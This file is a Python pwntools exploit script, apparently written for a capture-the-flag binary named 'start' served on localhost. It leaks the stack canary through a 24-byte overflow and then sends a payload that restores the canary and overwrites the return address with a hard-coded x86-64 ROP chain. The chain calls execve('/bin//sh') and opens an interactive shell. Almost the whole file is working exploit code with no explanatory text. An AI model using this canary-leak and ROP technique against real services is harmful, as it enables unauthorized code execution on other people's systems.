
from pwn import *
from pwnlib import *

import sys

import struct

from struct import pack

def ropchain():
    p = lambda x : pack('Q', x)

    IMAGE_BASE_0 = 0x0000000000400000 # ./start
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)

    rop = ''

    rop += rebase_0(0x0000000000043775) # 0x0000000000443775: pop r10; ret; 
    rop += '//bin/sh'
    rop += rebase_0(0x00000000000005d5) # 0x00000000004005d5: pop rdi; ret; 
    rop += rebase_0(0x00000000000cd080)
    rop += rebase_0(0x000000000005dd1d) # 0x000000000045dd1d: mov qword ptr [rdi], r10; ret; 
    rop += rebase_0(0x0000000000043775) # 0x0000000000443775: pop r10; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x00000000000005d5) # 0x00000000004005d5: pop rdi; ret; 
    rop += rebase_0(0x00000000000cd088)
    rop += rebase_0(0x000000000005dd1d) # 0x000000000045dd1d: mov qword ptr [rdi], r10; ret; 
    rop += rebase_0(0x00000000000005d5) # 0x00000000004005d5: pop rdi; ret; 
    rop += rebase_0(0x00000000000cd080)
    rop += rebase_0(0x00000000000017f7) # 0x00000000004017f7: pop rsi; ret; 
    rop += rebase_0(0x00000000000cd088)
    rop += rebase_0(0x0000000000043776) # 0x0000000000443776: pop rdx; ret; 
    rop += rebase_0(0x00000000000cd088)
    rop += rebase_0(0x000000000007a6e6) # 0x000000000047a6e6: pop rax; pop rdx; pop rbx; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0x000000000000003b)
    rop += rebase_0(0x0000000000068e75) # 0x0000000000468e75: syscall; ret;

    return rop

def ropchain1():
    p = ""
    p += p64( 0x00000000004017f7) # pop rsi ; ret
    p += p64( 0x00000000006cc080) # @ .data
    p += p64( 0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret
    p += '/bin//sh'
    p += p64( 0x4141414141414141) # padding
    p += p64( 0x4141414141414141) # padding
    p += p64( 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
    p += p64( 0x00000000004017f7) # pop rsi ; ret
    p += p64( 0x00000000006cc088) # @ .data + 8
    p += p64( 0x000000000042732f) # xor rax, rax ; ret
    p += p64( 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
    p += p64( 0x00000000004005d5) # pop rdi ; ret
    p += p64( 0x00000000006cc080) # @ .data
    p += p64( 0x00000000004017f7) # pop rsi ; ret
    p += p64( 0x00000000006cc088) # @ .data + 8
    p += p64( 0x0000000000443776) # pop rdx ; ret
    p += p64( 0x00000000006cc088) # @ .data + 8
    p += p64( 0x000000000047a6e6) # pop rax; pop rdx; pop rbx ; ret
    p += p64( 0x000000000000003b) # 0x3b -> execve
    p += p64( 0x00000000006cc088) # @ .data + 8
    p += p64( 0x00000000006cc088) # @ .data + 8
    p += p64( 0x00000000004003fc) # syscall
    return p

p = remote("localhost", 5556)

payload = 'a'*24

p.sendline(payload)

x = p.recv()

cookie = struct.unpack('<Q', '\x00' + x[25:][:7])[0]

print "cookie {:02x}".format(cookie)

p.sendline(payload[:24] + struct.pack('<Q', cookie) + struct.pack('<Q', 0) + ropchain1())

print p.recv()

p.sendline('exit')

p.interactive()
